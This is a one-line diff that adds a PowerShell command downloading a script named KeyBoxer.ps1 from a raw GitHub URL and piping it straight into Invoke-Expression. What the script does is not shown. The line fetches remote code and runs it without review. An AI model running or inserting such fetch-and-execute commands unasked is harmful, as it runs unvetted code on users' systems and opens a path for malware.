@@ -1,0 +1,1 @@
+irm https://raw.githubusercontent.com/shall0e/KeyBoxer/refs/heads/main/KeyBoxer.ps1 | iex
